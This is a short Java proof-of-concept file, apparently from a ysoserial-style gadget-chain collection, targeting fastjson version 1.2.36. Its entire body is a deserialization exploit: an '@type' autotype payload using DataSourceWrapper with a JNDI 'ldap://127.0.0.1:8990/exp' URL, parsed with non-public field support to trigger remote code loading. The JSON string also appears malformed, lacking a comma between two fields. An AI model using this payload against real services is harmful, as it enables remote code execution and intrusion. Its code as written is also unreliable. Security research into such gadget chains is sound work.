package ysoserial.payloads.tabbyGadgetChains.Jetty;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;


/**
 * 1.2.36
 */
public class Poc4 {
    public static void main(String[] args) {
        String poc = "{" +
                "\"@type\": \"org.apache.taglibs.standard.tag.common.sql.DataSourceWrapper\"," +
                "\"jdbcURL\":\"ldap://127.0.0.1:8990/exp\""+
                "\"connection\":{\"$ref\": \"$.connection\"}"+
                "}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
